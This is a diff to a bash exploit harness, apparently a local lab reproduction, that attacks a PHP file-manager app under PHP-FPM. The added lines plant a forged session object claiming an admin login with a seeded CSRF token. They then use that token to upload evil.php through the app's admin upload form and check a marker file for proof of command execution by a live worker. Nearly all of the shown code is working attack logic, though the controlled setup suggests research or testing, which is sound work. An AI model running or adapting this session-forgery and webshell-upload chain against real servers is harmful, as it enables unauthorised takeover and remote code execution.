@@ -45,6 +45,11 @@ ONE_POOL=${ONE_POOL:-0}
 TOKEN_REFRESH=${TOKEN_REFRESH:-0}
 [ "$TOKEN_REFRESH" = 0 ] || [ "$TOKEN_REFRESH" = 1 ] || { echo "TOKEN_REFRESH must be 0 or 1"; exit 2; }
 [ "$TOKEN_REFRESH" = 0 ] || [ "$ONE_POOL" = 1 ] || { echo "TOKEN_REFRESH=1 requires ONE_POOL=1"; exit 2; }
+TOKEN_SEED=${TOKEN_SEED:-0}
+[ "$TOKEN_SEED" = 0 ] || [ "$GAP" = 1 ] || { echo "TOKEN_SEED=1 requires GAP=1"; exit 2; }
+SEEDED_TOKEN=${SEEDED_TOKEN:-0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef}
+[ "${#SEEDED_TOKEN}" = 64 ] || { echo "SEEDED_TOKEN must be 64 hex chars"; exit 2; }
+case "$SEEDED_TOKEN" in *[!0-9a-f]*) echo "SEEDED_TOKEN must be 64 hex chars"; exit 2;; esac
 PM_MAX_CHILDREN=1
 [ "$ONE_POOL" = 0 ] || PM_MAX_CHILDREN=2
 if [ -z "${DISPLAY_ERRORS+x}" ]; then DISPLAY_ERRORS=1; [ "$DEATH_MODE" = rlimit ] && DISPLAY_ERRORS=0; fi
@@ -110,9 +115,12 @@ BOUNDARY='---------------------------20896060251896012921717172737'
 HOST=127.0.0.1
 
 OBJ='filemanager|a:1:{s:6:"logged";s:5:"admin";}'
+if [ "$TOKEN_SEED" = 1 ]; then
+    OBJ="$OBJ"'token|s:64:"'"$SEEDED_TOKEN"'";'
+fi
 FILLER=${FILLER:-X}
 [ "${#FILLER}" = 1 ] || { echo "FILLER must be one byte"; exit 2; }
-echo "conditions: sid=$SID filler=$FILLER progress_freq=$PROGRESS_FREQ attack_bytes=$ARMED_BYTES trail_bytes=$ARMED_TRAIL_BYTES aslr=$ASLR" >> "$LOG"
+echo "conditions: sid=$SID filler=$FILLER progress_freq=$PROGRESS_FREQ attack_bytes=$ARMED_BYTES trail_bytes=$ARMED_TRAIL_BYTES aslr=$ASLR token_seed=$TOKEN_SEED seeded_token=$SEEDED_TOKEN" >> "$LOG"
 X700=$(head -c 700 /dev/zero | tr '\0' "$FILLER")
 rm -f "$WEB/evil.php"
 EVIL="$D/evil.php"
@@ -494,6 +502,10 @@ m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"", d)
 print(m.group(1) if m else "")' "$D/consumerR.out")
             echo "gap: refreshed token $GAP_TOKEN from a live consumer GET immediately before upload" | tee -a "$LOG"
         fi
+        if [ "$TOKEN_SEED" = 1 ]; then
+            GAP_TOKEN=$SEEDED_TOKEN
+            echo "gap: upload token seeded from the promoted session record: $GAP_TOKEN" | tee -a "$LOG"
+        fi
         upload "$GAP_TOKEN" > "$D/upload.out" 2>&1
         GAP_UPLOAD_DONE=1
         echo "gap: authenticated admin upload fired with token $GAP_TOKEN while producer worker $OLDCHILD and request $PRODPID were live" | tee -a "$LOG"
@@ -637,8 +649,10 @@ fi
 # ---- designed admin action: upload evil.php through the app's own form
 EXECOK=0
 MARKER_OK=0
+UPLOAD_TOKEN=$TOKEN
+[ "$TOKEN_SEED" = 0 ] || UPLOAD_TOKEN=$SEEDED_TOKEN
 if [ "$TAKEOVER" = 1 ]; then
-    [ "$GAP_UPLOAD_DONE" = 1 ] || upload "$TOKEN" > "$D/upload.out" 2>&1
+    [ "$GAP_UPLOAD_DONE" = 1 ] || upload "$UPLOAD_TOKEN" > "$D/upload.out" 2>&1
     cat "$D/upload.out" >> "$LOG"
     if grep -q '"status":"success"' "$D/upload.out"; then
         echo "   admin UPLOAD accepted by the app: $WEB/evil.php" | tee -a "$LOG"
@@ -662,8 +676,18 @@ fi
 MARKER_CONTENT=$(cat "$MARKER" 2>/dev/null || true)
 if [ -n "$MARKER_CONTENT" ] && printf '%s\n' "$MARKER_CONTENT" | grep -q "^executed by pid ${MARKPID:-$NEWCHILD}$" && printf '%s\n' "$MARKER_CONTENT" | grep -q '^uid='; then
     MARKER_OK=1
+elif [ "$ONE_POOL" = 1 ] && [ -n "$MARKER_CONTENT" ] && printf '%s\n' "$MARKER_CONTENT" | grep -q '^uid='; then
+    # One pool has two live workers of the same master; FPM may dispatch the
+    # /evil.php GET to either. Both are real app workers, so accept a PID that
+    # is a live child of that master and belongs to this run.
+    EXEC_PID=$(printf '%s\n' "$MARKER_CONTENT" | sed -n 's/^executed by pid \([0-9][0-9]*\)$/\1/p')
+    if [ -n "$EXEC_PID" ] && child_pids | grep -qx "$EXEC_PID" &&
+       { [ "$EXEC_PID" = "$OLDCHILD" ] || [ "$EXEC_PID" = "$NEWCHILD" ] || [ "$EXEC_PID" = "$MARKPID" ]; }; then
+        echo "   one-pool: /evil.php served by live pool worker $EXEC_PID (consumer worker $MARKPID also live)" | tee -a "$LOG"
+        MARKER_OK=1
+    fi
 fi
-echo "marker-file-present-after-attack: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no) pid-bound-to-new-worker=$MARKER_OK" | tee -a "$LOG"
+echo "marker-file-present-after-attack: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no) pid-bound-to-live-worker=$MARKER_OK" | tee -a "$LOG"
 [ -f "$MARKER" ] && { echo "   marker file $MARKER:"; cat "$MARKER"; } >> "$LOG"
 [ "$EXECOK" = 1 ] && [ "$MARKER_OK" != 1 ] && { echo "   COMMAND EXECUTION REJECTED: target marker missing or not PID-bound" | tee -a "$LOG"; EXECOK=0; }
 # Preserve the positive side effect in the log, then require both controls to
